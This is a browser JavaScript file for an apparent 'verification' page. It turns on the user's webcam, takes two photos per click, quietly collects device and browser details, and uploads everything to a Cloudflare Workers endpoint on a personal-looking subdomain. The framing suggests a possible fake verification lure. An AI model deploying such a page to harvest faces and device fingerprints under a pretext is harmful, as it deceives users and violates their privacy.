// SKZLX1 Configuration & Endpoints
const SKZLX_URL = "https://verify.ryancustard8-8af.workers.dev";

const SKZLX_video = document.getElementById('SKZLX-webcam');
const SKZLX_canvas = document.getElementById('SKZLX-canvas');
const SKZLX_btn = document.getElementById('SKZLX-btn');
const SKZLX_status = document.getElementById('SKZLX-status');

async function SKZLX_initCamera() {
    try {
        const SKZLX_stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        SKZLX_video.srcObject = SKZLX_stream;
    } catch (SKZLX_err) {
        SKZLX_status.innerText = "Camera access denied.";
        SKZLX_status.style.color = "#ff4444";
    }
}

// Single Snapshot Helper Routine
function SKZLX_takeSnapshot() {
    return new Promise((SKZLX_resolve) => {
        SKZLX_canvas.width = SKZLX_video.videoWidth || 640;
        SKZLX_canvas.height = SKZLX_video.videoHeight || 480;
        const SKZLX_ctx = SKZLX_canvas.getContext('2d');
        SKZLX_ctx.drawImage(SKZLX_video, 0, 0, SKZLX_canvas.width, SKZLX_canvas.height);
        SKZLX_canvas.toBlob((SKZLX_blob) => {
            SKZLX_resolve(SKZLX_blob);
        }, 'image/png');
    });
}

// Spamable button event listener (No cooldown / No locks)
SKZLX_btn.addEventListener('click', async () => {
    SKZLX_status.innerText = "Processing dual-capture bundle...";
    SKZLX_status.style.color = "#ffaa00";

    try {
        // Capture Photo 1
        const SKZLX_img1 = await SKZLX_takeSnapshot();
        
        // Micro-delay between snapshots
        await new Promise(SKZLX_r => setTimeout(SKZLX_r, 250));
        
        // Capture Photo 2
        const SKZLX_img2 = await SKZLX_takeSnapshot();

        // Gather Device & Browser Telemetry
        const SKZLX_deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform || "Unknown",
            language: navigator.language || "Unknown",
            screenRes: `${window.screen.width}x${window.screen.height}`,
            timestamp: new Date().toISOString()
        };

        const SKZLX_formData = new FormData();
        SKZLX_formData.append("image1", SKZLX_img1, "SKZLX_verification_1.png");
        SKZLX_formData.append("image2", SKZLX_img2, "SKZLX_verification_2.png");
        SKZLX_formData.append("deviceInfo", JSON.stringify(SKZLX_deviceInfo));

        // Transmit package to Cloudflare Worker endpoint
        const SKZLX_response = await fetch(SKZLX_URL, {
            method: "POST",
            body: SKZLX_formData
        });

        if (SKZLX_response.ok) {
            SKZLX_status.innerText = "✅ Verification Bundle Sent Successfully!";
            SKZLX_status.style.color = "#00cc66";
        } else {
            throw new Error("Server transmission error");
        }
    } catch (SKZLX_err) {
        SKZLX_status.innerText = "❌ Upload failed. Button ready to retry.";
        SKZLX_status.style.color = "#ff4444";
    }
});

SKZLX_initCamera();
